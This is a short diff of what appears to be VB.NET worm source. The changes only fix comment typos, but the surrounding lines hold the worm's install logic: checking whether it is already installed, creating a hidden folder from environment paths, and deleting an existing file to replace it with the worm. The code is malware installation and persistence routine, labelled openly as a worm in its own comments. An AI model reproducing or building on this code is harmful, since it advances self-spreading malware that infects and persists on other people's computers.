@@ -7,11 +7,11 @@
 
         If Settings.DROP AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then 'Checking if worm is already installed
 
-            'Worm not installed// begein installing
+            'Worm not installed// begin installing
             Try
                 If Not IO.Directory.Exists(Environ(Settings.PATH1) & "\" & Settings.PATH2) Then 'Checking and creating FOLDER PATH1 PATH2
                     IO.Directory.CreateDirectory(Environ(Settings.PATH1) & "\" & Settings.PATH2)
-                ElseIf IO.File.Exists(Settings.fullpath) Then 'If somehow filename exists, instead of duplicate , I will delete it and replace it with worm
+                ElseIf IO.File.Exists(Settings.fullpath) Then 'If somehow filename exists , I will delete it and replace it with worm
                     IO.File.Delete(Settings.fullpath)
                 End If
 
